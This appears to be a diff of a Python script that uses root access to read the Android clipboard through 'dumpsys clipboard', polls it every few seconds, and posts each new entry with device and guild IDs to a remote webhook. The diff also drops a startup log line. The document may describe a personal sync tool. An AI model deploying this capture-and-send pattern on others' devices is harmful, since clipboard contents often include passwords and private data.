@@ -17,24 +17,25 @@ def get_clip():
     try:
         # Puxa o dump completo do clipboard via Root
         cmd = 'su -c "dumpsys clipboard"'
-        res = subprocess.check_output(cmd, shell=True, stderr=subprocess.DEVNULL).decode('utf-8')
+        res = subprocess.check_output(cmd, shell=True, stderr=subprocess.DEVNULL).decode('utf-8', errors='ignore')
         
-        # O Android guarda o texto dentro de aspas simples logo após 'mText=' ou 'text='
-        # Vamos usar uma busca que pega o que está entre aspas simples
-        match = re.search(r"mText='([^']*)'", res)
-        if not match:
-            match = re.search(r"text='([^']*)'", res)
-            
-        if match:
-            return match.group(1).strip()
+        # 1º Tentativa (Padrão nativo do Android 10/11): {T:Texto Aqui}
+        match1 = re.search(r'\{T:([^}]+)\}', res)
+        if match1: return match1.group(1).strip()
+        
+        # 2º Tentativa (Padrão de variáveis mText ou text)
+        match2 = re.search(r'(?:mText|text)=[\'"]?([^\'"\n\r]+)[\'"]?', res)
+        if match2: return match2.group(1).strip()
+        
+        # 3º Tentativa (Padrão bruto de logs antigos)
+        match3 = re.search(r'Text:\s*"(.*?)"', res)
+        if match3: return match3.group(1).strip()
+        
         return ""
-    except:
+    except Exception:
         return ""
 
 last_clip = get_clip()
-# Log inicial para sabermos que o script está vivo
-with open("functions/copy_log.txt", "a") as f:
-    f.write(f"\n[{time.ctime()}] Monitoramento Iniciado. Clip atual: '{last_clip}'")
 
 while True:
     try:
@@ -42,13 +43,18 @@ while True:
         
         if current and current != last_clip:
             payload = {"texto": current, "device_id": device_id, "guild_id": guild_id}
+            
             # Tenta enviar para a Vercel
             r = requests.post(URL_WEBHOOK, json=payload, headers=headers, timeout=5)
             
             if r.status_code == 200:
                 last_clip = current
-                with open("last_activity.txt", "w") as f: f.write(str(time.time()))
-    except:
+                try:
+                    with open("last_activity.txt", "w") as f: 
+                        f.write(str(time.time()))
+                except:
+                    pass
+    except Exception:
         pass
         
-    time.sleep(3) # Aumentei para 3s para evitar que o Android mate por alto consumo
+    time.sleep(3)
